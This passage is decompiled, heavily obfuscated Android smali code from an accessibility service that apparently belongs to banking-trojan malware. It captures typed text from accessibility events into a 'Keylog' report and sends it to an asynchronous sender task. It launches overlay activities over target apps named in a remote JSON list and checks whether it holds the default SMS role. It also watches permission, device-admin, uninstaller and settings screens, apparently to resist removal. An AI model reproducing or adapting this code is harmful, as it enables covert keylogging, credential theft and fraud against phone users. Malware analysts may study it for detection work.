    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_6

    if-nez v0, :cond_6

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "8192"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "TYPE_VIEW_TEXT_CHANGED"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    if-eqz v2, :cond_6

    :cond_5
    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v2, 0x1

    if-le v0, v2, :cond_9

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v1, v0, -0x1

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_6
    :goto_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_a

    :goto_3
    return-void

    :cond_7
    const/4 v2, 0x0

    goto/16 :goto_0

    :cond_8
    :try_start_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "["

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "]"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    goto/16 :goto_1

    :catch_0
    move-exception v0

    goto :goto_2

    :cond_9
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_6

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :cond_a
    const-string v0, "%s"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    aput-object v4, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    const-string v0, "%s"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v4, 0x0

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v1, v4

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v0, "%s"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v6, 0x0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v7

    aput-object v7, v1, v6

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    const/4 v0, 0x1

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x13

    if-lt v1, v7, :cond_b

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    :cond_b
    const/4 v1, -0x1

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v7

    sparse-switch v7, :sswitch_data_0

    :cond_c
    :goto_4
    packed-switch v1, :pswitch_data_0

    :cond_d
    :goto_5
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto/16 :goto_3

    :sswitch_0
    const-string v7, "TYPE_VIEW_CLICKED"

    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_c

    const/4 v1, 0x0

    goto :goto_4

    :sswitch_1
    const-string v7, "TYPE_WINDOW_STATE_CHANGED"

    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_c

    const/4 v1, 0x1

    goto :goto_4

    :pswitch_0
    sput-object v6, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/lang/String;

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_d

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/util/Map;

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v6, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-direct {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Ljava/lang/String;)V

    goto :goto_5

    :pswitch_1
    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    const-string v7, ""

    invoke-virtual {v1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_e

    :try_start_2
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v7, "\nInited by: "

    invoke-direct {v1, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "\n\nKeylog: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v3, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    sget-object v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/lang/String;

    const-string v8, ""

    invoke-virtual {v1, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_16

    const-string v1, "keylog"

    :goto_6
    const-string v8, "app"

    invoke-virtual {v7, v8, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "report"

    invoke-virtual {v7, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v8, "keylog"

    invoke-direct {v1, v3, v8}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v8, 0x0

    invoke-virtual {v7}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v7

    aput-object v7, v3, v8

    invoke-virtual {v1, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    const-string v1, ""

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    const-string v1, ""

    sput-object v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_4

    :cond_e
    :goto_7
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x13

    if-lt v1, v3, :cond_f

    :try_start_3
    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/util/Map;

    invoke-interface {v1}, Ljava/util/Map;->clear()V

    const-string v1, ""

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v7, 0x0

    invoke-direct {p0, v1, v6, v3, v7}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;IZ)V

    invoke-direct {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :cond_f
    :goto_8
    const/4 v1, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v3

    sparse-switch v3, :sswitch_data_1

    :cond_10
    :goto_9
    packed-switch v1, :pswitch_data_1

    :try_start_4
    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/h;->a(Landroid/content/Context;)Lorg/json/JSONArray;

    move-result-object v7

    if-eqz v7, :cond_d

    invoke-virtual {v7}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_d

    const/4 v0, 0x0

    move v2, v0

    :goto_a
    invoke-virtual {v7}, Lorg/json/JSONArray;->length()I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    move-result v0

    if-ge v2, v0, :cond_d

    :try_start_5
    invoke-virtual {v7, v2}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v8

    const-string v0, "name"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v0, "type"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const/4 v0, -0x1

    const-string v1, "window"

    invoke-virtual {v10, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_11

    const/4 v0, 0x1

    :cond_11
    const-string v1, "fullscreen"

    invoke-virtual {v10, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_12

    const/4 v0, 0x0

    :cond_12
    const-string v1, "lock"

    invoke-virtual {v10, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v0, 0x2

    move v1, v0

    :goto_b
    const-string v0, "apps"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v11

    const/4 v0, 0x1

    const-string v3, "s_flow"

    invoke-virtual {v8, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_13

    const-string v0, "s_flow"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    :cond_13
    const/4 v3, 0x0

    move v4, v3

    :goto_c
    invoke-virtual {v11}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-ge v4, v3, :cond_17

    invoke-virtual {v11, v4}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v6}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_15

    sget-boolean v12, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Z

    if-nez v12, :cond_15

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v3, v0, v12}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Ljava/lang/String;ILandroid/content/Context;)Z

    move-result v12

    if-eqz v12, :cond_15

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v12}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/jleqvmdifhbavistjrzpugyrganfbhfqcotshejsmnezcuxygwmiwkdqybwtvxlkxnaruocplkopzd;->a(Landroid/content/Context;)Z

    move-result v12

    if-eqz v12, :cond_15

    sput-object v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b:Ljava/lang/String;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    const-string v3, "link"

    invoke-virtual {v8, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const/4 v3, 0x0

    packed-switch v1, :pswitch_data_2

    :cond_14
    :goto_d
    if-eqz v3, :cond_15

    invoke-virtual {v12, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    :cond_15
    add-int/lit8 v3, v4, 0x1

    move v4, v3

    goto :goto_c

    :cond_16
    :try_start_6
    sget-object v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/lang/String;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_4

    goto/16 :goto_6

    :sswitch_2
    const-string v3, "com.android.packageinstaller.permission.ui.GrantPermissionsActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x1

    goto/16 :goto_9

    :sswitch_3
    const-string v3, "com.android.settings.applications.InstalledAppDetailsTop"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x2

    goto/16 :goto_9

    :sswitch_4
    const-string v3, "com.android.packageinstaller.permission.ui.ManagePermissionsActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x3

    goto/16 :goto_9

    :sswitch_5
    const-string v3, "com.android.mms.settings.EntrancePrefActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x4

    goto/16 :goto_9

    :sswitch_6
    const-string v3, "com.android.mms.settings.CheckDefaultSmsAppsActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x5

    goto/16 :goto_9

    :sswitch_7
    const-string v3, "com.android.settings"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x6

    goto/16 :goto_9

    :sswitch_8
    const-string v3, "com.android.settings.SubSettings"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v1, 0x7

    goto/16 :goto_9

    :sswitch_9
    const-string v3, "com.android.systemui.media.MediaProjectionPermissionActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0x8

    goto/16 :goto_9

    :sswitch_a
    const-string v3, "com.android.settings.Settings$ManageDefaultAppsActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0x9

    goto/16 :goto_9

    :sswitch_b
    const-string v3, "android.app.Dialog"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0xa

    goto/16 :goto_9

    :sswitch_c
    const-string v3, "android.app.AlertDialog"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0xb

    goto/16 :goto_9

    :sswitch_d
    const-string v3, "com.android.settings.SmsDefaultDialog"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0xc

    goto/16 :goto_9

    :sswitch_e
    const-string v3, "com.android.packageinstaller.UninstallerActivity"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0xd

    goto/16 :goto_9

    :sswitch_f
    const-string v3, "com.android.settings.DeviceAdminAdd"

